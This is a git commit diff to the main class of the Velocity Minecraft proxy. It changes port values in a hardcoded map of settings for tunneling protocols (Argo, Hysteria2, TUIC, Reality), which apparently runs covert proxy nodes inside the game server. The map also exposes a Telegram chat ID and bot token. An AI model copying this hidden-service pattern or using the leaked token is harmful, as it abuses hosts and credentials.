c7446a96a89ace7fb97a4f03c923cc991fca63fd
leolee1998 <168069603+leolee1998@users.noreply.github.com>
2025-09-15 23:17:55 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -154,9 +154,9 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "24598");
+    envVars.put("HY2_PORT", "24625");
     envVars.put("TUIC_PORT", "");
-    envVars.put("REALITY_PORT", "25002");
+    envVars.put("REALITY_PORT", "25147");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6975394604");
     envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
